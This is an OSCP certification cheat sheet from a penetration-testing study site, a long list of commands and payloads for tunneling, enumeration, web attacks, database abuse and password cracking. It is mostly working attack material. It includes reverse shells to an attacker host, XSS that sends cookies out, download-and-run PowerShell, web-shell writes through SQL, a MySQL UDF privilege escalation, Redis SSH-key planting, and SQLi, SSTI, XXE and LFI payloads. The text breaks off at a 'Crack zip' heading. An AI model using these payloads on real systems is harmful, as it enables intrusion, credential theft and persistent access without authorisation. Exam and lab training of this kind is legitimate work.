

[🏠 Main Site](https://motasem-notes.net/) · [🛒 Store](https://shop.motasem-notes.net/) · [▶ YouTube](https://www.youtube.com/@MotasemHamdan) · [☕ Membership](https://buymeacoffee.com/notescatalog/membership)

**Get the full OSCP study notes in PDF over 800 pages from [here](https://buymeacoffee.com/notescatalog/e/165578)**

# OSCP Cheat Sheet

> **Commands, Payloads, and Resources for the OffSec Certified Professional (OSCP / OSCP+) Certification. Covers Proving Grounds boxes, exam techniques, and AD CS / Shadow Credential attacks added for OSCP+.

> ⚠️ **DISCLAIMER:** `sqlmap` and the automatic exploitation functionality of `LinPEAS` are **prohibited** in the exam. Metasploit is permitted for **one** module only. Always verify tool restrictions against the [OSCP Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) before exam day.

---

## 01 · Basics

### curl

```bash
curl -v http://<DOMAIN>                                          # verbose output
curl -X POST http://<DOMAIN>                                     # POST request
curl -X PUT http://<DOMAIN>                                      # PUT request
curl --path-as-is http://<DOMAIN>/../../../../../../etc/passwd   # path traversal
curl --proxy http://127.0.0.1:8080 http://<DOMAIN>              # route through Burp
curl -F myFile=@<FILE> http://<RHOST>                            # file upload
curl${IFS}<LHOST>/<FILE>                                         # IFS bypass (no spaces)
```

---

### Chisel — Tunneling & Pivoting

#### Reverse Pivot (Single Port)

```bash
# On attacker machine
./chisel server -p 9002 -reverse -v

# On target machine
./chisel client <LHOST>:9002 R:3000:127.0.0.1:3000
```

#### SOCKS5 Proxy (via Proxychains)

```bash
# On attacker machine
./chisel server -p 9002 -reverse -v

# On target machine
./chisel client <LHOST>:9002 R:socks

# Add to /etc/proxychains.conf:
# socks5 127.0.0.1 1080
```

---

### Ligolo-ng — Layer 3 Tunneling

> https://github.com/nicocha30/ligolo-ng

```bash
# Download binaries
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz

# Prepare tun interface on attacker machine
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Start proxy on attacker machine
./proxy -laddr <LHOST>:443 -selfcert

# Start agent on target machine
./agent -connect <LHOST>:443 -ignore-cert

# In ligolo session:
ligolo-ng » session
[Agent : user@target] » ifconfig
sudo ip r add 172.16.1.0/24 dev ligolo    # add route to pivot network
[Agent : user@target] » start
```

---

### File Transfer

#### Windows — Certutil

```cmd
certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
```

#### Windows — PowerShell

```powershell
iwr <LHOST>/<FILE> -o <FILE>
IEX(IWR http://<LHOST>/<FILE>) -UseBasicParsing
powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\temp\<FILE>
```

#### Linux/Windows — Netcat

```bash
# Sender
nc <RHOST> <RPORT> < <FILE>

# Receiver
nc -lnvp <LPORT> > <FILE>
```

#### Impacket SMB Server

```bash
sudo impacket-smbserver <SHARE> ./
sudo impacket-smbserver <SHARE> . -smb2support

# On Windows target:
copy * \\<LHOST>\<SHARE>
```

#### Bash-only wget (no wget installed)

```bash
function __wget() {
    local URL=$1
    read proto server path <<<$(echo ${URL//// })
    DOC=/${path// //}; HOST=${server//:*}; PORT=${server//*:}
    [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
    exec 3<>/dev/tcp/${HOST}/$PORT
    echo -en "GET ${DOC} HTTP/1.1\r\nHost: ${HOST}\r\nConnection: close\r\n\r\n" >&3
    while read line; do
        [[ $mark -eq 1 ]] && echo $line
        if [[ "${line}" =~ "Connection: close" ]]; then mark=1; fi
    done <&3
    exec 3>&-
}
__wget http://<LHOST>/<FILE>
```

---

### FTP

```bash
ftp <RHOST>
wget -r ftp://anonymous:anonymous@<RHOST>   # anonymous recursive download
```

---

### RDP

```bash
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /dynamic-resolution +clipboard
xfreerdp /v:<RHOST> /u:<USERNAME> /d:<DOMAIN> /pth:'<HASH>' /dynamic-resolution +clipboard   # Pass-the-Hash
rdesktop <RHOST>
```

---

### SMB — smbclient

```bash
smbclient -L \\<RHOST>\ -N                   # list shares, null session
smbclient -U "<USERNAME>" -L \\\\<RHOST>\\   # list shares, authenticated
smbclient //<RHOST>/SYSVOL -U <USERNAME>%<PASSWORD>
smbclient "\\\\<RHOST>\<SHARE>"
smbclient --no-pass //<RHOST>/<SHARE>

# Mount a share
mount.cifs //<RHOST>/<SHARE> /mnt/remote

# Download all files
mask ""
recurse ON
prompt OFF
mget *

# Upload all files
recurse ON
prompt OFF
mput *
```

---

### SSH

```bash
# Connect with legacy key exchange (old targets)
ssh user@<RHOST> -oKexAlgorithms=+diffie-hellman-group1-sha1

# Local port forward (access remote service locally)
ssh -L 8000:127.0.0.1:8000 <USERNAME>@<RHOST>
ssh -N -L 1234:127.0.0.1:1234 <USERNAME>@<RHOST>
ssh -L 80:localhost:80 <USERNAME>@<RHOST>

# Remote port forward (expose local port on remote)
ssh -R 8080:<LHOST>:80 <USERNAME>@<RHOST>

# SOCKS proxy via SSH
ssh -NCD 3000 <USERNAME>@<RHOST>

# Tunnel through Privoxy running remotely
ssh -C -L 5555:127.0.0.1:8118 <USERNAME>@<RHOST>
```

---

### socat

```bash
# Port forward / relay
socat TCP-LISTEN:<LPORT>,fork TCP:<RHOST>:<RPORT>

# Interactive shell upgrade (attacker side listener)
socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>

# Connect back (target side)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>

# Relay WinRM
socat tcp-listen:5986,reuseaddr,fork tcp:<RHOST>:9002 &
```

---

### Shell Upgrades

```bash
# Python PTY
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

# After spawning PTY:
ctrl + z
stty raw -echo
fg
Enter
Enter
export XTERM=xterm

# One-liner after getting PTY
stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;

# Script method
script -q /dev/null -c bash
/usr/bin/script -qc /bin/bash /dev/null

# Fix staircase effect
env reset
# or
stty onlcr
```

---

### Tmux — Key Bindings

```
Ctrl+b + w          # show windows
Ctrl+b + "          # split horizontal
Ctrl+b + %          # split vertical
Ctrl+b + ,          # rename window
Ctrl+b + {          # flip pane left
Ctrl+b + }          # flip pane right
Ctrl+b + spacebar   # cycle pane layout

# Copy/Paste (vi mode)
:setw -g mode-keys vi
Ctrl+b + [          # enter copy mode
space               # begin selection
enter               # copy selection
Ctrl+b + ]          # paste

# Search in copy mode
Ctrl+b + [
Ctrl + /            # search (vi mode)
n                   # next match
N                   # previous match

# Logging
Ctrl+b + Shift+P    # toggle logging

# Save buffer
Ctrl+b + :capture-pane -S -
Ctrl+b + :save-buffer <FILE>.txt
```

---

### Kerberos Setup

```bash
sudo apt-get install krb5-kdc

# Get TGT
impacket-getTGT <DOMAIN>/<USERNAME>:'<PASSWORD>'
export KRB5CCNAME=<FILE>.ccache

# Kerberos tools
kinit <USERNAME>          # request ticket
klist                      # list cached tickets
kdestroy                   # delete cached tickets
klist -k /etc/krb5.keytab  # list keytab

# Fix Kerberos clock skew (critical for AD attacks)
sudo ntpdate <DC_IP>
sudo timedatectl set-timezone UTC
```

---

### Time Synchronization (AD Clock Skew Fix)

```bash
sudo nmap -sU -p 123 --script ntp-info <RHOST>   # get server time
sudo ntpdate <RHOST>
sudo ntpdate -s <RHOST>
sudo ntpdate -b -u <RHOST>
sudo net time -c <RHOST>
sudo net time set -S <RHOST>

# Continuous sync loop
while [ 1 ]; do sudo ntpdate <RHOST>; done

# Manual time set
sudo timedatectl set-time '2024-01-15 10:00:00'

# Stop time sync services before manual sync
sudo systemctl stop systemd-timesyncd
sudo systemctl disable --now chronyd
sudo /etc/init.d/virtualbox-guest-utils stop
```

---

### Python / PHP Web Servers (Quick File Hosting)

```bash
# Python
sudo python3 -m http.server 80
sudo python -m SimpleHTTPServer 80

# PHP
sudo php -S 127.0.0.1:80
```

---

### Linux Compilation & Environment

```bash
# Compile C exploit
gcc (--static) -m32 -Wl,--hash-style=both exploit.c -o exploit

# Cross-compile for Windows
i686-w64-mingw32-gcc -o main32.exe main.c
x86_64-w64-mingw32-gcc -o main64.exe main.c

# Add current dir to PATH
export PATH=`pwd`:$PATH

# UTF-16LE encode for PowerShell payloads
echo "<COMMAND>" | iconv -t UTF-16LE | base64 -w 0
echo "<COMMAND>" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
iconv -f ASCII -t UTF-16LE <FILE>.txt | base64 | tr -d "\n"

# Save file with elevated privileges from vi
:w !sudo tee %

# Check ACLs
getfacl <LOCAL_DIRECTORY>

# CentOS su alternative
doas -u <USERNAME> /bin/sh
```

---

## 02 · Information Gathering

### Nmap

```bash
# Standard full scan
sudo nmap -A -T4 -sC -sV -p- <RHOST>

# UDP scan
sudo nmap -sV -sU <RHOST>

# Vuln scripts
sudo nmap -A -T4 -sC -sV --script vuln <RHOST>

# Discovery scripts
sudo nmap -A -T4 -p- -sS -sV -oN initial --script discovery <RHOST>

# Slow scan to evade rate limiting / IDS
sudo nmap -sC -sV -p- --scan-delay 5s <RHOST>

# Kerberos user enumeration
sudo nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test' <RHOST>

# List useful NSE scripts
ls -lh /usr/share/nmap/scripts/*ssh*
locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
```

---

### Port Scanning (No Nmap)

```bash
# Netcat port scan
for p in {1..65535}; do nc -vn <RHOST> $p -w 1 -z & done 2> open_ports.txt

# Bash TCP scan
export ip=<RHOST>
for port in $(seq 1 65535); do
    timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo The port $port is open" 2>/dev/null
done
```

---

### NetBIOS / SMB Enumeration

```bash
nbtscan <RHOST>
nmblookup -A <RHOST>
```

---

### snmpwalk — SNMP Enumeration

```bash
snmpwalk -c public -v1 <RHOST>
snmpwalk -v2c -c public <RHOST> .1
snmpwalk -v2c -c public <RHOST> nsExtendObjects

# Windows users via SNMP
snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.25

# Running processes via SNMP
snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.4.2.1.2

# Installed software via SNMP
snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.6.3.1.2

# Open TCP ports via SNMP
snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.6.13.1.3
```

---

### memcached

```bash
# Port: 11211/UDP
npm install -g memcached-cli
memcached-cli <USERNAME>:<PASSWORD>@<RHOST>:11211

# Raw UDP query
echo -en "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n" | nc -q1 -u 127.0.0.1 11211

# Nmap script
sudo nmap -p 11211 -sU -sS --script memcached-info

# Manual enumeration after connecting
stats items
stats cachedump 1 0
get user
get passwd
get password
get username
```

---

## 03 · Web Application Analysis

### Burp Suite — Shortcuts

```
Ctrl+r          # Send to Repeater
Ctrl+i          # Send to Intruder
Ctrl+Shift+b    # Base64 encode
Ctrl+Shift+u    # URL decode
```

```bash
# Set proxy environment variables
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=https://localhost:8080
```

---

### ffuf — Web Fuzzing

```bash
# Basic directory fuzzing
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ --fs <NUMBER> -mc all

# Filter by word count
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ --fw <NUMBER> -mc all

# Save results
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ -mc 200,204,301,302,307,401 -o results.txt

# Subdomain discovery
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
    -u http://<RHOST>/ -H "Host: FUZZ.<RHOST>" -fs 185

# Timed backup files (e.g., backup_20200704160000.zip)
ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt \
    -u http://<RHOST>/backups/backup_2020070416FUZZ.zip

# API fuzzing
ffuf -u https://<RHOST>/api/v2/FUZZ -w api_seen_in_wild.txt -c -ac -t 250 -fc 400,404,412

# LFI fuzzing
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
    -u http://<RHOST>/admin../admin_staging/index.php?page=FUZZ -fs 15349

# Fuzzing with PHP session cookie
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt \
    -u "http://<RHOST>/admin/FUZZ.php" -b "PHPSESSID=a0mjo6ukbkq271nb2rkb1joamp" -fw 2644

# Recursive fuzzing
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt \
    -u http://<RHOST>/cd/basic/FUZZ -recursion

# File extension fuzzing
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt \
    -u http://<RHOST>/cd/ext/logs/FUZZ -e .log

# Rate limiting bypass (slow down scan)
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt \
    -t 5 -p 0.1 -u http://<RHOST>/cd/rate/FUZZ -mc 200,429

# Virtual host discovery
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    -H "Host: FUZZ.<RHOST>" -u http://<RHOST> -ac

# Massive multi-extension file discovery
ffuf -w /opt/seclists/Discovery/Web-Content/directory-list-1.0.txt \
    -u http://<RHOST>/FUZZ -t 30 -c \
    -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' \
    -mc 200,204,301,302,307,401,403,500 -ic \
    -e .7z,.asp,.aspx,.backup,.bak,.conf,.config,.db,.html,.ini,.jar,.jsp,.json,.log,.old,.pdf,.php,.py,.sql,.txt,.xml,.zip
```

---

### Gobuster

```bash
# Directory brute force
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>/ -x php
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://<RHOST>/ -x php,txt,html,js -e -s 200

# HTTPS with wildcard
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
    -u https://<RHOST>:<PORT>/ -b 200 -k --wildcard

# POST endpoint brute force
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
    -u http://<RHOST>/api/ -e -s 200

# DNS subdomain bruteforce
gobuster dns -d <RHOST> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
gobuster dns -d <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt

# Virtual host discovery
gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain

# Custom User-Agent
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/ -a Linux
```

**Common Extensions:** `txt,bak,php,html,js,asp,aspx` **Common Image Extensions:** `png,jpg,jpeg,gif,bmp`

---

### wfuzz

```bash
# Basic fuzzing
wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt -u http://<RHOST>/FUZZ/<FILE>.php --hc '403,404'

# Write results to file
wfuzz -w /PATH/TO/WORDLIST -c -f <FILE> -u http://<RHOST> --hc 403,404

# Custom scan
wfuzz -w /PATH/TO/WORDLIST -u http://<RHOST>/dev/304c0c90fbc6520610abbf378e2339d1/db/file_FUZZ.txt --sc 200 -t 20

# Two parameters simultaneously
wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt \
    -u http://<RHOST>/<directory>/FUZZ.FUZ2Z -z list,txt-php --hc 403,404 -c

# Subdomain fuzzing
wfuzz --hh 0 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    -H 'Host: FUZZ.<RHOST>' -u http://<RHOST>/

# Login brute force (POST)
wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" \
    -d "email=FUZZ&password=<PASSWORD>" \
    -w /PATH/TO/WORDLIST.txt --hc 200 -c

wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" \
    -d "username=FUZZ&password=<PASSWORD>" \
    -w /PATH/TO/WORDLIST.txt --ss "Invalid login"

# SQL injection fuzzing
wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/SQLi/Generic-SQLi.txt \
    -d 'db=FUZZ' --hl 16 http://<RHOST>/select_http

# DNS fuzzing
wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt \
    --hc 400,404,403 -H "Host: FUZZ.<RHOST>" -u http://<RHOST> -t 100

# Enumerate PIDs
wfuzz -u 'http://<RHOST>/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline' \
    -z range,900-1000

# Numbered backup files
wfuzz -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt \
    --hw 31 http://<RHOST>/backups/backup_2021052315FUZZ.zip
```

---

### WPScan — WordPress

```bash
wpscan --url https://<RHOST> --enumerate u,t,p
wpscan --url https://<RHOST> --plugins-detection aggressive
wpscan --url https://<RHOST> --disable-tls-checks
wpscan --url https://<RHOST> --disable-tls-checks --enumerate u,t,p
wpscan --url http://<RHOST> -U <USERNAME> -P passwords.txt -t 50
```

---

### GitTools — Exposed .git Recovery

```bash
./gitdumper.sh http://<RHOST>/.git/ /PATH/TO/OUTPUT/
./extractor.sh /PATH/TO/OUTPUT/ /PATH/TO/EXTRACTED/
```

---

### WebDAV — cadaver

```bash
cadaver http://<RHOST>/<WEBDAV_DIRECTORY>/

# Inside cadaver session:
dav:/<WEBDAV_DIRECTORY>/> cd C
dav:/<WEBDAV_DIRECTORY>/C/> ls
dav:/<WEBDAV_DIRECTORY>/C/> put <FILE>
```

---

### Local File Inclusion (LFI)

```bash
# Basic LFI
http://<RHOST>/<FILE>.php?file=../../../../../../../../etc/passwd

# Null byte (PHP < 5.3)
http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd%00

# Encoded traversal strings
../
..\
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
..././
...\.\

# php://filter base64 read
http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=index
http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
base64 -d <encoded_output>

# Full filter chain example
url=php://filter/convert.base64-encode/resource=file:////var/www/<RHOST>/api.php
```

#### LFI — Linux Sensitive Files

```
/etc/passwd                         /etc/shadow
/etc/ssh/ssh_config                 /etc/ssh/sshd_config
/etc/ssh/ssh_host_rsa_key           /etc/ssh/ssh_host_dsa_key
/proc/self/environ                  /proc/cmdline
/proc/self/cwd/app.py               /proc/self/net/arp
/var/log/auth.log                   /var/log/apache2/access.log
/var/log/apache2/error.log          /var/log/syslog
/etc/apache2/apache2.conf           /etc/apache2/sites-enabled/000-default.conf
/etc/mysql/my.cnf                   /etc/crontab
/etc/hosts                          /etc/hostname
/etc/fstab                          /etc/exports
~/.ssh/id_rsa                       ~/.ssh/authorized_keys
~/.bash_history                     ~/.bashrc
~/.profile                          ~/.mysql_history
```

#### LFI — Windows Sensitive Files

```
C:/Windows/System32/drivers/etc/hosts
C:/Windows/repair/SAM
C:/Windows/Panther/Unattend/Unattended.xml
C:/Windows/system32/config/regback/SAM
C:/inetpub/wwwroot/global.asa
C:/Program Files/Apache Group/Apache2/conf/httpd.conf
C:/xampp/apache/conf/httpd.conf
C:/Windows/win.ini
C:/boot.ini
C:/Windows/debug/NetSetup.log
C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
```

---

### PHP Upload Filter Bypasses

```
.sh        .cgi       .inc       .txt       .pht
.phtml     .phP       .Php       .php3      .php4
.php5      .php7      .phar      .phpt      .pgif
.phtml     .phtm      .php%00    .php%20
.php%0d%0a.jpg        .php%0a    .php.jpg
.php%00.gif           .php\x00.gif
.php%00.png           .php\x00.jpg
```

---

### PHP Filter Chain Generator (RCE via LFI)

> https://github.com/synacktiv/php_filter_chain_generator

```bash
python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
python3 php_filter_chain_generator.py --chain "<?php echo shell_exec(id); ?>"
python3 php_filter_chain_generator.py --chain '<?php exec("/bin/bash -c '"'"'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"'"'");?>'

# The generated chain is used as:
http://<RHOST>/?page=<CHAIN>&0=<COMMAND>
```

---

### Cross-Site Scripting (XSS)

```html
<!-- Basic payload -->
<script>alert(1)</script>
<script>alert(document.cookie)</script>

<!-- Image src onerror -->
<img src=x onerror=alert(1)>

<!-- Fetch cookie to attacker -->
<script>document.location='http://<LHOST>/?c='+document.cookie</script>
<script>new Image().src='http://<LHOST>/?c='+document.cookie</script>

<!-- WordPress admin user creation via XSS + CSRF -->
var params="action=createuser&_wpnonce_create-user="+nonce+
    "&user_login=<USERNAME>&email=<EMAIL>&pass1=<PASSWORD>&pass2=<PASSWORD>&role=administrator";
ajaxRequest=new XMLHttpRequest;
ajaxRequest.open("POST",requestURL,!0);
ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

---

### Server-Side Template Injection (SSTI)

```
# Fuzz string (triggers errors in most engines)
${{<%[%'"}}%\.

# Jinja2 / Flask
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ config.items() }}
{{ ''.__class__.__mro__[[)[408]('id',shell=True,stdout=-1|1]].communicate() }}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# FreeMarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

---

### Server-Side Request Forgery (SSRF)

```bash
https://<RHOST>/item/2?server=server.<RHOST>/file?id=9&x=
http://<RHOST>/ssrf?url=http://127.0.0.1/admin
http://<RHOST>/ssrf?url=file:///etc/passwd
http://<RHOST>/ssrf?url=http://169.254.169.254/latest/meta-data/   # AWS metadata
```

---

### XML External Entity (XXE)

```xml
<!-- Linux file read -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [ <!ENTITY passwd SYSTEM 'file:///etc/passwd'> ]>
<stockCheck>
    <productId>&passwd;</productId>
    <storeId>1</storeId>
</stockCheck>

<!-- Windows file read -->
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>
<order>
    <quantity>3</quantity>
    <item>&test;</item>
    <address>17th Estate, CA</address>
</order>

<!-- SSRF via XXE -->
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE data [<!ENTITY xxe SYSTEM "http://<LHOST>:80/shell.php" >]>
<data>&xxe;</data>

<!-- URL-encoded SSH key read -->
username=%26username%3b&version=1.0.0--><!DOCTYPE+username+[+<!ENTITY+username+SYSTEM+"/root/.ssh/id_rsa">+]><!--
```

---

### Upload Vulnerabilities — Attack Matrix

|File Type|Attack Vector|
|---|---|
|ASP / ASPX / PHP / PHP3 / PHP5|Webshell / Remote Code Execution|
|SVG|Stored XSS / SSRF|
|GIF|Stored XSS|
|CSV|CSV Injection|
|XML|XXE|
|AVI|LFI / SSRF|
|HTML / JS|HTML Injection / XSS / Open Redirect|
|PNG / JPEG|Pixel Flood Attack|
|ZIP|RCE via LFI|
|PDF / PPTX|SSRF / Blind XXE|

---

## 04 · Database Analysis

### MySQL

```bash
# Connect
mysql -u <USERNAME> -p<PASSWORD> -h <RHOST>
mysql -u root -p

# Enumeration
SHOW databases;
USE <DATABASE>;
SHOW tables;
DESCRIBE <TABLE>;
SELECT * FROM <TABLE>;
SELECT user, password FROM mysql.user;
SELECT user(), version(), @@datadir;

# Write file (if FILE privilege)
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';

# Read file
SELECT LOAD_FILE('/etc/passwd');

# User-Defined Function privilege escalation
# (MySQL UDF exploit — requires file write + plugin load)
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/lib_mysqludf_sys.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
select sys_exec('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

---

### MSSQL

```bash
# Connect
impacket-mssqlclient <USERNAME>:<PASSWORD>@<RHOST>
impacket-mssqlclient <USERNAME>:<PASSWORD>@<RHOST> -windows-auth

# Enable xp_cmdshell
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

# Execute OS command
EXECUTE xp_cmdshell 'whoami';

# Enumeration
SELECT name FROM master.dbo.sysdatabases;
SELECT * FROM information_schema.tables;
SELECT table_name FROM information_schema.tables WHERE table_schema = '<DATABASE>';
```

#### sqlcmd (Windows)

```cmd
sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'
sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>' -Q "SELECT name FROM master.dbo.sysdatabases"
```

---

### PostgreSQL

```bash
# Connect
psql -h <RHOST> -U <USERNAME>
psql -h <RHOST> -U <USERNAME> -d <DATABASE>

# Enumeration
\list                           # list databases
\c <DATABASE>                   # connect to database
\dt                             # list tables
SELECT version();
SELECT current_user;
SELECT * FROM pg_shadow;        # password hashes

# Copy command for file read/write
COPY <TABLE> TO '/tmp/output.txt';
COPY <TABLE> FROM '/etc/passwd';

# RCE (as superuser)
CREATE TABLE cmd_output(line text);
COPY cmd_output FROM PROGRAM 'id';
SELECT * FROM cmd_output;
```

---

### MongoDB

```bash
mongo "mongodb://localhost:27017"
mongo -u <USERNAME> -p <PASSWORD> --host <RHOST>

# Enumeration
show dbs
use <DATABASE>
show collections
db.<COLLECTION>.find()
db.<COLLECTION>.find().pretty()
db.findOne()
```

---

### Redis

```bash
redis-cli -h <RHOST>
redis-cli -h <RHOST> -a <PASSWORD>

# Enumeration
INFO
CONFIG GET *
KEYS *
GET <KEY>

# Write SSH key (if writable path)
config set dir /home/<USER>/.ssh/
config set dbfilename authorized_keys
set x "\n\n\nssh-rsa AAAA... attacker@kali\n\n\n"
save
```

---

### SQL Injection

```bash
# Classic union-based
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' ORDER BY 3--
' UNION SELECT username,password FROM users--

# Error-based
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

# Blind boolean-based
' AND 1=1--
' AND 1=2--
' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='admin')='a'--

# Time-based blind (MySQL)
' AND SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--    # MSSQL

# Common authentication bypass payloads
' OR '1'='1
' OR 1=1--
admin'--
' OR 'x'='x
```

#### SQL Truncation Attack

```sql
-- If username field is 20 chars and you register:
-- "admin               " (admin + 15 spaces + any char)
-- It truncates to "admin" and overwrites the admin row
INSERT INTO users (username, password) VALUES ('admin               x', 'newpass');
```

---

### NoSQL Injection

```bash
# MongoDB bypass
username=admin&password[$ne]=invalid
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": ".*"}}
```

---

### sqlite3

```bash
sqlite3 <DATABASE>.db
.tables
.schema <TABLE>
SELECT * FROM <TABLE>;
.dump
```

---

### sqsh (MSSQL alternative)

```bash
sqsh -S <RHOST> -U <USERNAME> -P <PASSWORD>
sqsh -S <RHOST> -U <USERNAME> -P <PASSWORD> -D <DATABASE>
```

---

## 05 · Password Attacks

### hashcat

```bash
# Hash mode reference
hashcat -m 0    # MD5
hashcat -m 100  # SHA1
hashcat -m 1000 # NTLM
hashcat -m 1800 # sha512crypt $6$ (Linux shadow)
hashcat -m 3200 # bcrypt $2*$
hashcat -m 13100 # Kerberos TGS-REP (etype 23) — Kerberoasting
hashcat -m 18200 # Kerberos AS-REP (etype 23) — AS-REP Roasting
hashcat -m 13000 # RAR5
hashcat -m 22000 # WPA-PBKDF2 (handshake)

# Attack modes
hashcat -a 0 <HASH> <WORDLIST>                          # dictionary
hashcat -a 1 <HASH> <WORDLIST1> <WORDLIST2>             # combination
hashcat -a 3 <HASH> ?d?d?d?d?d?d                        # brute force mask
hashcat -a 6 <HASH> <WORDLIST> ?d?d?d?d                  # hybrid

# Examples
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt    # kerberoasting
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt  # as-rep roasting
```

---

### John the Ripper

```bash
# Crack hash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Specific format
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=NT
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt

# Show cracked
john hash.txt --show

# Prepare shadow file
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Crack zip
